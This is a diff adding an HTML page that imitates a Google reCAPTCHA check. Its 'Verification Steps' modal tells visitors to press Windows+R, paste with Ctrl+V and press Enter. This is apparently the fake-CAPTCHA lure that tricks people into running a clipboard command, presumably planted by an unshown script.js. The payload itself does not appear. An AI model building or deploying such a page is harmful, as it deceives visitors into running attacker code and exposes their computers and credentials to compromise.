@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CAPTCHA Verification | captcha.github.io</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="content">
+            <h1>Security Verification</h1>
+            <p>Please verify that you're not a robot to continue.</p>
+            
+            <!-- reCAPTCHA Widget -->
+            <div class="captcha-wrapper">
+                <div class="captcha-box">
+                    <div class="captcha-checkbox">
+                        <input type="checkbox" id="captcha-checkbox" class="checkbox-input">
+                        <label for="captcha-checkbox" class="checkbox-label">
+                            <span class="checkmark"></span>
+                            <span class="text">I'm not a robot</span>
+                        </label>
+                    </div>
+                    <div class="captcha-logo">
+                        <svg class="recaptcha-icon" viewBox="0 0 200 30" xmlns="http://www.w3.org/2000/svg">
+                            <!-- reCAPTCHA Logo Recreation -->
+                            <g id="logo">
+                                <!-- Blue circular part -->
+                                <circle cx="150" cy="15" r="10" fill="#4285f4" opacity="0.8"/>
+                                <!-- Gray circular part -->
+                                <circle cx="160" cy="15" r="8" fill="#9aa0a6" opacity="0.8"/>
+                                <!-- Arrow -->
+                                <path d="M155 8 L158 15 L155 22" stroke="#4285f4" stroke-width="1.5" fill="none"/>
+                            </g>
+                        </svg>
+                        <div class="logo-text">
+                            <div class="recaptcha-text">reCAPTCHA</div>
+                            <div class="privacy-text">
+                                <a href="#privacy">Privacy</a> - <a href="#terms">Terms</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Verification Steps Modal -->
+    <div id="verificationModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>Verification Steps</h2>
+            </div>
+            <div class="modal-body">
+                <div class="steps-container">
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <div class="step-text">Press Windows Button "<span class="windows-icon">⊞</span>" + R</div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <div class="step-text">Press CTRL + V</div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">3</div>
+                        <div class="step-text">Press Enter</div>
+                    </div>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button id="closeModal" class="btn-close">Close</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Background overlay for modal -->
+    <div id="modalOverlay" class="modal-overlay"></div>
+
+    <script src="script.js"></script>
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+</body>
+</html>
